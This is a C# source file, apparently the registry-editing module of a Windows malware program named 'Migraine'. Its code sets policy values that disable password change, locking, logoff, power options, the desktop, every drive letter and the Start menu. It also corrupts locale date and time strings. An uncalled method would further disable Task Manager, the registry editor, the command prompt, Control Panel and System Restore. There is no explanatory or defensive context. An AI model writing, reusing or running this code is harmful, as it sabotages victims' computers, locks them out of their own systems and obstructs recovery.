using Microsoft.Win32;

namespace Migraine
{
    class RegistryEdits
    {
        public static void Edit()
        {
            CtrlAltDel();
            System();
            StartMenu();
            ControlPanel();
        }

        public static void CtrlAltDel()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key.SetValue("DisableChangePassword", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key.SetValue("DisableLockWorkstation", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("NoLogoff", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("HidePowerOptions", 1, RegistryValueKind.DWord);
            key.Close();
        }

        public static void System()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\NonEnum");
            key.SetValue("{645FF040-5081-101B-9F08-00AA002F954E}", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("NoDrives", 67108863, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("NoDesktop", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("NoClose", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("NoFolderOptions", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key.SetValue("shutdownwithoutlogin", 0, RegistryValueKind.DWord);
            key.Close();
        }

        public static void DisableTools()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key.SetValue("DisableRegistryTools", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("NoRun", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System");
            key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("NoControlPanel", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\System");
            key.SetValue("DisableCMD", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows NT\\SystemRestore");
            key.SetValue("DisableConfig", 1, RegistryValueKind.DWord);
            key.Close();
        }

        public static void StartMenu()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ShowMyGames", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_TrackDocs", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_TrackProgs", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ShowUser", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ShowMyComputer", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ShowMyDocs", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ShowControlPanel", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ShowHelp", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ShowMyMusic", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ShowMyPics", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_SearchFiles", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_SearchPrograms", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_AdminToolsRoot", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ShowPrinters", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_EnableDragDrop", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_NotifyNewApps", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_MinMFU", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_LargeMFUIcons", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ShowNetConn", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ScrollPrograms", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ShowRecentDocs", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("StartMenuFavorites", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("StartMenuAdminTools", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("SuperHidden", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_ShowSetProgramAccessAndDefaults", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced");
            key.SetValue("Start_AutoCascade", 0, RegistryValueKind.DWord);
            key.Close();

            key = Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("StartMenuLogOff", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("NoFind", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("NoStartMenuPinnedList", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("NoSMHelp", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("NoUserNameInStartMenu", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer");
            key.SetValue("NoStartMenuMorePrograms", 1, RegistryValueKind.DWord);
            key.Close();

            key = Registry.LocalMachine.CreateSubKey("Software\\Policies\\Microsoft\\Windows\\Explorer");
            key.SetValue("DisableContextMenusInStart", 1, RegistryValueKind.DWord);
            key.Close();
        }

        public static void ControlPanel()
        {
            RegistryKey key = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
            key.SetValue("s1159", "TB", RegistryValueKind.String);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
            key.SetValue("s2359", "TB", RegistryValueKind.String);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
            key.SetValue("sLongDate", "TB", RegistryValueKind.String);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
            key.SetValue("sNativeDigits", "TB", RegistryValueKind.String);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
            key.SetValue("sShortDate", "TB", RegistryValueKind.String);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
            key.SetValue("sShortTime", "TB", RegistryValueKind.String);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
            key.SetValue("sTimeFormat", "TB", RegistryValueKind.String);
            key.Close();

            key = Registry.CurrentUser.CreateSubKey("Control Panel\\International");
            key.SetValue("sYearMonth", "TB", RegistryValueKind.String);
            key.Close();
        }
    }
}
